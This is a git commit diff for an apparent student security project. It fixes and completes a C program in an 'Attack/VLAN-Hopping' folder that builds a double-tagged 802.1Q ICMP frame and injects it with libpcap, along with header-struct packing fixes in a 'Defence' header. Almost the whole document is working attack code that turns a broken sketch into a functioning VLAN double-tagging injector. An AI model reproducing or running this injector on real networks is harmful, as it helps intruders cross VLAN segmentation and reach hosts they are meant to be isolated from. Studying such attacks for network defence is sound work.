c19c3a78ade6f24e6dd0250bca578d8aa6b4ed9b
aerdemcagatay <aecagatay24@gmail.com>
2017-07-14 16:36:05 +0300

    Expert view on code

--- Attack/VLAN-Hopping/vlan_hopping.c
+++ Attack/VLAN-Hopping/vlan_hopping.c
@@ -3,7 +3,7 @@
 #include <string.h>
 #include <arpa/inet.h>
 #include "../includes/lib_attack.h"
-
+#include <pcap.h>
 
 #define ICMP_PACKET_SIZE 64
 
@@ -20,8 +20,7 @@ int main(int argc, char const *argv[]) {
     FILE *file = fopen("./VLAN-Hopping/vlan_hopping_configuration.conf", "r");
     char sourceIP[16];
     char sourceMAC[18];
-    char sm1[4], sm2[4], sm3[4], sm4[4], sm5[4], sm6[4];
-    char *sms[6] = {sm1, sm2, sm3, sm4, sm5, sm6};
+    unsigned char mac[6];
     char buff[50];
     
     for(int i = 0; i < 8; i++){
@@ -35,50 +34,39 @@ int main(int argc, char const *argv[]) {
         fscanf(file,"%s",buff);
     }
     strcpy(sourceMAC, buff);
-    printf("Source MAC: %s\n", sourceMAC);
-    
+    sscanf(sourceMAC, "%x:%x:%x:%x:%x:%x", mac + 0, mac + 1, mac + 2, mac + 3, mac + 4, mac + 5);
+    printf("Source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
     fclose(file);
-    
-    char *tokenPtr;
-    tokenPtr = strtok(sourceMAC, ":\n");
-    
-    for(int i = 0; i < 6; i += 4){
-        strcpy(sms[i], "0x");
-        strcat(sms[i], tokenPtr);
-        tokenPtr = strtok(NULL, ":\n");
-    }
-    
+printf("size: %u\n", sizeof(struct vlan_tag_header));
     /**************************************************************/
     
     int packet_size = sizeof(struct vlan_ethernet_header) + sizeof(struct ip_header) + sizeof(struct icmp_packet);
     
-    u_char *packet = malloc((size_t) packet_size);
+    u_char *packet = calloc(1, (size_t) packet_size);
     
     
     struct vlan_ethernet_header * eth_hdr = (struct vlan_ethernet_header *) packet;
     struct ip_header * ip_hdr = (struct ip_header *) (packet + sizeof(struct vlan_ethernet_header));
-    struct icmp_packet * icmp_pck = (struct icmp_packet *) (ip_hdr + sizeof(struct ip_header));
+    struct icmp_packet * icmp_pck = (struct icmp_packet *) ((char *)ip_hdr + sizeof(struct ip_header));
     
     u_char tmp_dest_mac[ETHER_ADDR_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    u_char tmp_src_mac[ETHER_ADDR_LEN] = {(u_char) sm1, (u_char) sm2, (u_char) sm3,
-        (u_char) sm4, (u_char) sm5, (u_char) sm6};
     
-    strncpy((char *)eth_hdr->ether_dhost, (const char *)tmp_dest_mac, ETHER_ADDR_LEN);
-    strncpy((char *)eth_hdr->ether_shost, (const char *)tmp_src_mac, ETHER_ADDR_LEN);
+    memcpy((char *)eth_hdr->ether_dhost, (const char *)tmp_dest_mac, ETHER_ADDR_LEN);
+    memcpy((char *)eth_hdr->ether_shost, (const char *)mac, ETHER_ADDR_LEN);
     
-    eth_hdr->customer.tpid = 0x8100;	// 802.1Q
-    eth_hdr->customer.pcp_dei = 0;
-    eth_hdr->customer.vid = 1;
+#ifndef DISABLE_VLAN
+    eth_hdr->customer.tpid = htons(0x8100);	// 802.1Q
+    eth_hdr->customer.pcp_vid = htons(1);
     
-    eth_hdr->service.tpid = 0x8100;	// 802.1Q
-    eth_hdr->service.pcp_dei = 0;
-    eth_hdr->service.vid = 100;
+    eth_hdr->service.tpid = htons(0x8100);	// 802.1Q
+    eth_hdr->service.pcp_vid = htons(100);
+#endif
     
-    eth_hdr->ether_type = 0x0800;	/* IP type */
+    eth_hdr->ether_type = htons(0x0800);	/* IP type */
     
     ip_hdr->ip_vhl = (u_char)0x45;  /* version 4, length 5*/
     ip_hdr->ip_tos = 0;
-    ip_hdr->ip_len = packet_size - sizeof(struct vlan_ethernet_header);
+    ip_hdr->ip_len = htons(packet_size - sizeof(struct vlan_ethernet_header));
     ip_hdr->ip_id = htons(54321);
     ip_hdr->ip_off = 0;
     ip_hdr->ip_ttl = 255;
@@ -89,7 +77,7 @@ int main(int argc, char const *argv[]) {
     
     printf("%d\n", ip_hdr->ip_len);
     
-    ip_hdr->ip_sum = csum((unsigned short *) (packet + sizeof(struct vlan_ethernet_header)), ip_hdr->ip_len >> 1);
+    ip_hdr->ip_sum = csum((unsigned short *) (packet + sizeof(struct vlan_ethernet_header)), ntohs(ip_hdr->ip_len) >> 1);
     
     icmp_pck->icmp_hdr.icmph_type = 8;   /* echo */
     icmp_pck->icmp_hdr.icmph_code = 0;
@@ -100,5 +88,36 @@ int main(int argc, char const *argv[]) {
     
     icmp_pck->icmp_hdr.icmph_chksum = csum((unsigned short *) icmp_pck, sizeof(struct icmp_packet));
     
+    // Open a PCAP packet capture descriptor for the specified interface.
+    char *if_name=NULL;
+    char pcap_errbuf[PCAP_ERRBUF_SIZE];
+    pcap_errbuf[0]='\0';
+ //   if_name=pcap_lookupdev(pcap_errbuf);
+if_name = "wlp2s0.1.100";
+printf("%s\n",if_name);
+    if (if_name == NULL) {
+	fprintf(stderr, "Couldn't find default device: %s\n", pcap_errbuf);
+	exit(EXIT_FAILURE);
+    }
+    pcap_t* pcap=pcap_open_live(if_name, SNAP_LEN, 1, 1000,pcap_errbuf);
+    if (pcap_errbuf[0]!='\0') {
+        fprintf(stderr,"asdasd %s\n",pcap_errbuf);
+    }
+    if (!pcap) {
+        exit(1);
+    }
+
+    // Write the Ethernet frame to the interface.
+    if (pcap_inject(pcap,packet,packet_size)==-1) {
+	printf("boran\n");
+        pcap_perror(pcap,0);
+        pcap_close(pcap);
+        exit(1);
+    }
+
+
+    // Close the PCAP descriptor.
+    pcap_close(pcap);
+
     return 0;
 }
--- Defence/ip_headers.h
+++ Defence/ip_headers.h
@@ -23,7 +23,7 @@ struct ethernet_header {
     u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
     u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
     u_short ether_type;                     /* IP? ARP? RARP? etc */
-};
+} __attribute__((__packed__));
 
 /* IP header */
 struct ip_header {
@@ -40,7 +40,7 @@ struct ip_header {
     u_char  ip_p;                   /* protocol */
     u_short ip_sum;                 /* checksum */
     struct  in_addr ip_src, ip_dst;  /* source and dest address */
-};
+} __attribute__((__packed__));
 #define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
 #define IP_V(ip)                (((ip)->ip_vhl) >> 4)
 
@@ -68,24 +68,25 @@ struct tcp_header {
     u_short th_win;                 /* window */
     u_short th_sum;                 /* checksum */
     u_short th_urp;                 /* urgent pointer */
-};
+} __attribute__((__packed__));
 
 
 struct vlan_tag_header {
     u_short	tpid;	/*Tag protocol identifier*/
-    u_char pcp_dei;	/* priority = 0 default, drop eligible = 0*/
-    u_short vid;	/*VLAN identifier*/
-};
+    u_short     pcp_vid;
+} __attribute__((__packed__));
 
 
 /* Ethernet header */
 struct vlan_ethernet_header {
     u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
     u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
+#ifndef DISABLE_VLAN
     struct 	vlan_tag_header customer;
     struct 	vlan_tag_header service;
+#endif
     u_short ether_type;                     /* IP? ARP? RARP? etc */
-};
+} __attribute__((__packed__));
 
 
 /* ICMP header */
@@ -96,6 +97,6 @@ struct icmp_header {
     /* The following data structures are ICMP type specific */
     u_short icmph_ident;
     u_short icmph_seqnum;
-}; /* total ICMP header length: 8 bytes (= 64 bits) */
+} __attribute__((__packed__)); /* total ICMP header length: 8 bytes (= 64 bits) */
 
 #endif //VLAN_HOPPING_IP_HEADERS_H
